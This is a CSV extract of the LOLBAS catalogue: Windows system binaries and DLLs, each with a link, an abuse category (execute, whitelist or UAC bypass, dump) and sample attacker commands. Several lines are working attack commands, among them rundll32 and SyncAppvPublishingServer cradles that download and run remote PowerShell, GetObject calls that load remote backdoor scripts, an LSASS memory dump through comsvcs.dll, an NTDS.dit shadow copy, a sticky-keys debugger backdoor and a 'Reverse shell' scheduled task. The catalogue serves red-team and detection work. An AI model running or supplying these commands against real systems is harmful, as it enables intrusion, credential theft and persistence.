Name,BInary_Link,Function,Code(s)
Rundll32.exe,https://lolbas-project.github.io/lolbas/Binaries/Rundll32/,"[['Execute', 'Alternate data streams']]","['rundll32.exe AllTheThingsx64,EntryPoint', 'rundll32.exe \\\\10.10.10.10\\share\\payload.dll,EntryPoint', 'rundll32.exe javascript:""\\..\\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(\'http://ip:port/\');""', 'rundll32.exe javascript:""\\..\\mshtml.dll,RunHTMLApplication "";eval(""w=new%20ActiveXObject(\\""WScript.Shell\\"");w.run(\\""calc\\"");window.close()"");', 'rundll32.exe javascript:""\\..\\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WScript.Shell"").run(""calc.exe"",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe"",0,true);}', 'rundll32.exe javascript:""\\..\\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test"")', 'rundll32.exe -sta {CLSID}', 'rundll32 ""C:\\ads\\file.txt:ADSDLL.dll"",DllMain']"
Runonce.exe,https://lolbas-project.github.io/lolbas/Binaries/Runonce/,[['Execute']],['Runonce.exe /AlternateShellStartup']
Runscripthelper.exe,https://lolbas-project.github.io/lolbas/Binaries/Runscripthelper/,[['Execute']],['runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test']
Sc.exe,https://lolbas-project.github.io/lolbas/Binaries/Sc/,[['Alternate data streams']],"['sc create evilservice binPath=""\\""c:\\\\ADS\\\\file.txt:cmd.exe\\"" /c echo works > \\""c:\\ADS\\works.txt\\"""" DisplayName= ""evilservice"" start= auto\\ & sc start evilservice']"
Schtasks.exe,https://lolbas-project.github.io/lolbas/Binaries/Schtasks/,[['Execute']],"['schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr c:\\some\\directory\\revshell.exe']"
Scriptrunner.exe,https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/,[['Execute']],"['Scriptrunner.exe -appvscript calc.exe', 'ScriptRunner.exe -appvscript ""\\\\fileserver\\calc.cmd""']"
SyncAppvPublishingServer.exe,https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/,[['Execute']],"['SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""']"
Ttdinject.exe,https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/,[['Execute']],"['TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""C:/Windows/System32/calc.exe""', 'ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""C:/Windows/System32/calc.exe""']"
Tttracer.exe,https://lolbas-project.github.io/lolbas/Binaries/Tttracer/,"[['Execute', 'Dump']]","['tttracer.exe C:\\windows\\system32\\calc.exe', 'TTTracer.exe -dumpFull -attach pid']"
vbc.exe,https://lolbas-project.github.io/lolbas/Binaries/Vbc/,[['Compile']],"['vbc.exe /target:exe c:\\temp\\vbs\\run.vb', 'vbc -reference:Microsoft.VisualBasic.dll c:\\temp\\vbs\\run.vb']"
Verclsid.exe,https://lolbas-project.github.io/lolbas/Binaries/Verclsid/,[['Execute']],['verclsid.exe /S /C {CLSID}']
Wab.exe,https://lolbas-project.github.io/lolbas/Binaries/Wab/,[['Execute']],['wab.exe']
Wmic.exe,https://lolbas-project.github.io/lolbas/Binaries/Wmic/,"[['Alternate data streams', 'Execute']]","['wmic.exe process call create ""c:\\ads\\file.txt:program.exe""', 'wmic.exe process call create calc', 'wmic.exe process call create ""C:\\Windows\\system32\\reg.exe add \\""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\"" /v \\""Debugger\\"" /t REG_SZ /d \\""cmd.exe\\"" /f""', 'wmic.exe /node:""192.168.0.1"" process call create ""evil.exe""', 'wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create ""at 9:00PM c:\\GoogleUpdate.exe ^> c:\\notGoogleUpdateResults.txt""', 'wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create ""cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit""', 'wmic.exe process get brief /format:""https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl""', 'wmic.exe process get brief /format:""\\\\127.0.0.1\\c$\\Tools\\pocremote.xsl""']"
Wscript.exe,https://lolbas-project.github.io/lolbas/Binaries/Wscript/,[['Alternate data streams']],"['wscript c:\\ads\\file.txt:script.vbs', 'echo GetObject(""script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js"") > %temp%\\test.txt:hi.js && wscript.exe %temp%\\test.txt:hi.js']"
Wsreset.exe,https://lolbas-project.github.io/lolbas/Binaries/Wsreset/,[['UAC bypass']],['wsreset.exe']
Xwizard.exe,https://lolbas-project.github.io/lolbas/Binaries/Xwizard/,[['Execute']],"['xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}', 'xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}']"
Advpack.dll,https://lolbas-project.github.io/lolbas/Libraries/Advpack/,"[['AWL bypass', 'Execute']]","['rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,', 'rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,,1,', 'rundll32.exe advpack.dll,RegisterOCX test.dll', 'rundll32.exe advpack.dll,RegisterOCX calc.exe', 'rundll32 advpack.dll, RegisterOCX ""cmd.exe /c calc.exe""']"
Comsvcs.dll,https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/,[['Dump']],"['rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump ""[LSASS_PID] dump.bin full""']"
Ieadvpack.dll,https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/,"[['AWL bypass', 'Execute']]","['rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,', 'rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,,1,', 'rundll32.exe ieadvpack.dll,RegisterOCX test.dll', 'rundll32.exe ieadvpack.dll,RegisterOCX calc.exe', 'rundll32 ieadvpack.dll, RegisterOCX ""cmd.exe /c calc.exe""']"
Ieaframe.dll,https://lolbas-project.github.io/lolbas/Libraries/Ieframe/,[['Execute']],"['rundll32.exe ieframe.dll,OpenURL ""C:\\test\\calc.url""']"
Mshtml.dll,https://lolbas-project.github.io/lolbas/Libraries/Mshtml/,[['Execute']],"['rundll32.exe Mshtml.dll,PrintHTML ""C:\\temp\\calc.hta""']"
Pcwutl.dll,https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/,[['Execute']],"['rundll32.exe pcwutl.dll,LaunchApplication calc.exe']"
Setupapi.dll,https://lolbas-project.github.io/lolbas/Libraries/Setupapi/,"[['AWL bypass', 'Execute']]","['rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Tools\\shady.inf', 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\\\Tools\\\\calc_exe.inf']"
Shdocvw.dll,https://lolbas-project.github.io/lolbas/Libraries/Shdocvw/,[['Execute']],"['rundll32.exe shdocvw.dll,OpenURL ""C:\\test\\calc.url""']"
Shell32.dll,https://lolbas-project.github.io/lolbas/Libraries/Shell32/,[['Execute']],"['rundll32.exe shell32.dll,Control_RunDLL payload.dll', 'rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe', 'rundll32 SHELL32.DLL,ShellExec_RunDLL ""cmd.exe"" ""/c echo hi""']"
Syssetup.dll,https://lolbas-project.github.io/lolbas/Libraries/Syssetup/,"[['AWL bypass', 'Execute']]","['rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\test\\shady.inf', 'rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\temp\\something.inf']"
Url.dll,https://lolbas-project.github.io/lolbas/Libraries/Url/,[['Execute']],"['rundll32.exe url.dll,OpenURL ""C:\\test\\calc.hta""', 'rundll32.exe url.dll,OpenURL ""C:\\test\\calc.url""', 'rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e', 'rundll32.exe url.dll,FileProtocolHandler calc.exe', 'rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e', 'rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta']"
Zipfldr.dll,https://lolbas-project.github.io/lolbas/Libraries/Zipfldr/,[['Execute']],"['rundll32.exe zipfldr.dll,RouteTheCall calc.exe', 'rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e']"
AgentExecutor.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/,[['Execute']],"['AgentExecutor.exe -powershell ""c:\\temp\\malicious.ps1"" ""c:\\temp\\test.log"" ""c:\\temp\\test1.log"" ""c:\\temp\\test2.log"" 60000 ""C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0"" 0 1', 'AgentExecutor.exe -powershell ""c:\\temp\\malicious.ps1"" ""c:\\temp\\test.log"" ""c:\\temp\\test1.log"" ""c:\\temp\\test2.log"" 60000 ""C:\\temp\\"" 0 1']"
Appvlp.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/,[['Execute']],"['AppVLP.exe \\\\webdav\\calc.bat', 'AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute(\'calc.exe\',\'\', \'\', \'open\', 1)""', 'AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject excel.application;$e.RegisterXLL(\'\\\\webdav\\xll_poc.xll\')""']"
Bginfo.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Bginfo/,"[['Execute', 'AWL bypass']]","['bginfo.exe bginfo.bgi /popup /nolicprompt', '\\\\10.10.10.10\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt', '\\\\live.sysinternals.com\\Tools\\bginfo.exe \\\\10.10.10.10\\webdav\\bginfo.bgi /popup /nolicprompt', 'bginfo.exe bginfo.bgi /popup /nolicprompt', '\\\\10.10.10.10\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt', '\\\\live.sysinternals.com\\Tools\\bginfo.exe \\\\10.10.10.10\\webdav\\bginfo.bgi /popup /nolicprompt']"
Cdb.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/,[['Execute']],['cdb.exe -cf x64_calc.wds -o notepad.exe']
csi.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/,[['Execute']],['csi.exe file']
